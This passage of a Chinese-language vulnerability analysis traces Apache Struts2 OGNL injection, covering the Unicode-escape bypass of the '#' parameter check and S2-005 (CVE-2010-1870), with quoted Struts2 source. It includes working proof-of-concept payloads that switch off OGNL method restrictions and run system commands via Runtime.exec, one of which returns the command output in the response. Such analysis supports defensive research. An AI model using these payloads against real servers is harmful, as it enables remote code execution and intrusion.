</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>name</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=sc>&#39;=&#39;</span><span class=o>)</span> <span class=o>!=</span> <span class=o>-</span><span class=n>1</span> <span class=o>||</span> <span class=n>name</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=sc>&#39;,&#39;</span><span class=o>)</span> <span class=o>!=</span> <span class=o>-</span><span class=n>1</span> <span class=o>||</span> <span class=n>name</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=sc>&#39;#&#39;</span><span class=o>)</span> <span class=o>!=</span> <span class=o>-</span><span class=n>1</span>
</span></span><span class=line><span class=cl>            <span class=o>||</span> <span class=n>name</span><span class=o>.</span><span class=na>indexOf</span><span class=o>(</span><span class=sc>&#39;:&#39;</span><span class=o>)</span> <span class=o>!=</span> <span class=o>-</span><span class=n>1</span> <span class=o>||</span> <span class=n>isExcluded</span><span class=o>(</span><span class=n>name</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>需要关注参数名不能包含字符： <code>#</code> 。而我们知道如果我们要使用Ognl访问当前OgnlContext中的变量，需要使用 <code>#</code> 字符。如果我们可以绕过这个检查，就可以访问当前OgnlContext中的 <code>xwork.MethodAccessor.denyMethodExecution</code> 键值对，我们可以将其默认的true修改为false，这样我们就可以执行Ognl表达式了。这个地方的绕过很容易，Ognl支持UNICODE编码，我们直接将 <code>#</code> 字符进行UNICODE编码，即可访问当前OgnlContext中的变量了，然后将 <code>xwork.MethodAccessor.denyMethodExecution</code> 修改为false，使得能够使用Ognl表达式执行函数。</p><p>这里我传入的参数名为： <code>('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)</code> 。使用了UNICODE编码绕过了这个函数的检查。</p><p>继续往下跟，通过 <code>acceptableName(String)</code> 函数的检查后，将在此处往当前请求的OgnlValueStack中设置值：</p><p><img src=/media/image-20210813113955138.png alt=image-20210813113955138></p><p>这里因为 <code>xwork.MethodAccessor.denyMethodExecution</code> 为true，所以执行Ognl会提示不能执行 <code>exec()</code> 函数：</p><p><img src=/media/image-20210813114146453.png alt=image-20210813114146453></p><p>所以要想攻击成功，需要两个步骤（UNICODE编码绕过的前提下）：</p><ol><li>使用Ognl表达式将 <code>xwork.MethodAccessor.denyMethodExecution</code> 设置为false；</li><li>使用Ognl表达式调用命令执行的函数来执行命令；</li></ol><p>对应的POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\&#39;</span><span class=n>calc</span><span class=err>\</span><span class=sc>&#39;)&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>再次POC发包测试：</p><p><img src=/media/image-20210813115411652.png alt=image-20210813115411652></p><p><img src=/media/image-20210813115817606.png alt=image-20210813115817606></p><p>一直跟进 <code>stack.setValue()</code> ，发现底层是使用 <code>Ognl.setValue()</code> 来处理的，很明显这也是一个Ognl表达式注入的sink，并且 <code>xwork.MethodAccessor.denyMethodExecution</code> 的值为false，允许执行函数：</p><p><img src=/media/image-20210813120127294.png alt=image-20210813120127294></p><p>RCE证明如下：</p><p><img src=/media/image-20210817164917849.png alt=image-20210817164917849></p><h2 id=s2-005>S2-005</h2><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p><p>CVE编号：CVE-2010-1870</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 带回显：
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>excludeProperties</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.util.Collections@EMPTY_SET</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>kxlzx</span><span class=o>)(</span><span class=n>kxlzx</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>allowStaticMethodAccess</span><span class=err>\</span><span class=n>u003dtrue</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023mycmd</span><span class=err>\</span><span class=n>u003d</span><span class=err>\&#39;</span><span class=n>whoami</span><span class=err>\&#39;&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mycmd</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>A</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mydat</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>DataInputStream</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myret</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>())</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>B</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023myres</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40byte</span><span class=o>[</span><span class=n>51020</span><span class=o>]</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>C</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mydat</span><span class=o>.</span><span class=na>readFully</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myres</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>D</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mystr</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myres</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myout</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=o>()</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>E</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023myout</span><span class=o>.</span><span class=na>getWriter</span><span class=o>().</span><span class=na>println</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mystr</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 不带回显
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>allowStaticMethodAccess</span><span class=err>\</span><span class=n>u003dtrue</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023mycmd</span><span class=err>\</span><span class=n>u003d</span><span class=err>\&#39;</span><span class=n>calc</span><span class=err>\&#39;&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mycmd</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞很有意思，前面说过：Struts2从 <strong>S2-005</strong> 增加自定义的 <code>SecurityMemberAccess</code> ，可以设置是否允许调用静态方法等。但是有意思的是，我们可以使用Ognl表达式设置 <code>SecurityMemberAccess</code> 的安全配置，也就是： <strong>S2-005给自己上了一个锁，但是把锁钥匙给插在了锁头上</strong> 。</p><p>首先我们看到自定义的 <code>SecurityMemberAccess</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * Allows access decisions to be made on the basis of whether a member is static or not.
</span></span></span><span class=line><span class=cl><span class=cm> * Also blocks or allows access to properties.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>SecurityMemberAccess</span> <span class=kd>extends</span> <span class=n>DefaultMemberAccess</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=kt>boolean</span> <span class=n>allowStaticMethodAccess</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>Set</span><span class=o>&lt;</span><span class=n>Pattern</span><span class=o>&gt;</span> <span class=n>excludeProperties</span> <span class=o>=</span> <span class=n>Collections</span><span class=o>.</span><span class=na>emptySet</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Set</span><span class=o>&lt;</span><span class=n>Pattern</span><span class=o>&gt;</span> <span class=n>acceptProperties</span> <span class=o>=</span> <span class=n>Collections</span><span class=o>.</span><span class=na>emptySet</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=nf>SecurityMemberAccess</span><span class=o>(</span><span class=kt>boolean</span> <span class=n>method</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>super</span><span class=o>(</span><span class=kc>false</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>allowStaticMethodAccess</span> <span class=o>=</span> <span class=n>method</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>boolean</span> <span class=nf>getAllowStaticMethodAccess</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>allowStaticMethodAccess</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>setAllowStaticMethodAccess</span><span class=o>(</span><span class=kt>boolean</span> <span class=n>allowStaticMethodAccess</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>allowStaticMethodAccess</span> <span class=o>=</span> <span class=n>allowStaticMethodAccess</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>boolean</span> <span class=nf>isAccessible</span><span class=o>(</span><span class=n>Map</span> <span class=n>context</span><span class=o>,</span> <span class=n>Object</span> <span class=n>target</span><span class=o>,</span> <span class=n>Member</span> <span class=n>member</span><span class=o>,</span>
</span></span><span class=line><span class=cl>                                <span class=n>String</span> <span class=n>propertyName</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>boolean</span> <span class=n>allow</span> <span class=o>=</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>modifiers</span> <span class=o>=</span> <span class=n>member</span><span class=o>.</span><span class=na>getModifiers</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>Modifier</span><span class=o>.</span><span class=na>isStatic</span><span class=o>(</span><span class=n>modifiers</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>member</span> <span class=k>instanceof</span> <span class=n>Method</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>getAllowStaticMethodAccess</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>allow</span> <span class=o>=</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>target</span> <span class=k>instanceof</span> <span class=n>Class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>Class</span> <span class=n>clazz</span> <span class=o>=</span> <span class=o>(</span><span class=n>Class</span><span class=o>)</span> <span class=n>target</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                    <span class=n>Method</span> <span class=n>method</span> <span class=o>=</span> <span class=o>(</span><span class=n>Method</span><span class=o>)</span> <span class=n>member</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=o>(</span><span class=n>Enum</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=n>method</span><span class=o>.</span><span class=na>getName</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;values&#34;</span><span class=o>))</span>
</span></span><span class=line><span class=cl>                        <span class=n>allow</span> <span class=o>=</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//failed static test
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=o>(!</span><span class=n>allow</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Now check for standard scope rules
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=o>(!</span><span class=kd>super</span><span class=o>.</span><span class=na>isAccessible</span><span class=o>(</span><span class=n>context</span><span class=o>,</span> <span class=n>target</span><span class=o>,</span> <span class=n>member</span><span class=o>,</span> <span class=n>propertyName</span><span class=o>))</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>isAcceptableProperty</span><span class=o>(</span><span class=n>propertyName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>boolean</span> <span class=nf>isAcceptableProperty</span><span class=o>(</span><span class=n>String</span> <span class=n>name</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span> <span class=n>name</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>isAccepted</span><span class=o>(</span><span class=n>name</span><span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>isExcluded</span><span class=o>(</span><span class=n>name</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>boolean</span> <span class=nf>isAccepted</span><span class=o>(</span><span class=n>String</span> <span class=n>paramName</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(!</span><span class=k>this</span><span class=o>.</span><span class=na>acceptProperties</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=o>(</span><span class=n>Pattern</span> <span class=n>pattern</span> <span class=o>:</span> <span class=n>acceptProperties</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>Matcher</span> <span class=n>matcher</span> <span class=o>=</span> <span class=n>pattern</span><span class=o>.</span><span class=na>matcher</span><span class=o>(</span><span class=n>paramName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>matcher</span><span class=o>.</span><span class=na>matches</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>//no match, but acceptedParams is not empty
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//empty acceptedParams
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>boolean</span> <span class=nf>isExcluded</span><span class=o>(</span><span class=n>String</span> <span class=n>paramName</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(!</span><span class=k>this</span><span class=o>.</span><span class=na>excludeProperties</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=o>(</span><span class=n>Pattern</span> <span class=n>pattern</span> <span class=o>:</span> <span class=n>excludeProperties</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>Matcher</span> <span class=n>matcher</span> <span class=o>=</span> <span class=n>pattern</span><span class=o>.</span><span class=na>matcher</span><span class=o>(</span><span class=n>paramName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>matcher</span><span class=o>.</span><span class=na>matches</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=kc>true</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>false</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>setExcludeProperties</span><span class=o>(</span><span class=n>Set</span><span class=o>&lt;</span><span class=n>Pattern</span><span class=o>&gt;</span> <span class=n>excludeProperties</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>excludeProperties</span> <span class=o>=</span> <span class=n>excludeProperties</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>setAcceptProperties</span><span class=o>(</span><span class=n>Set</span><span class=o>&lt;</span><span class=n>Pattern</span><span class=o>&gt;</span> <span class=n>acceptedProperties</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>acceptProperties</span> <span class=o>=</span> <span class=n>acceptedProperties</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>注意到其中的方法： <code>public void setAllowStaticMethodAccess(boolean allowStaticMethodAccess)</code> ，其权限是public。并且 <code>SecurityMemberAccess</code> 对象可以使用Ognl表达式访问到，例如如下OgnlContext中的代码所示，存在 <code>public MemberAccess getMemberAccess()</code> 方法，所以Ognl表达式能访问到OgnlContext中的 <code>MemberAccess</code> ，也就是Struts2设置的 <code>SecurityMemberAccess</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=n>MemberAccess</span> <span class=nf>getMemberAccess</span><span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>_memberAccess</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
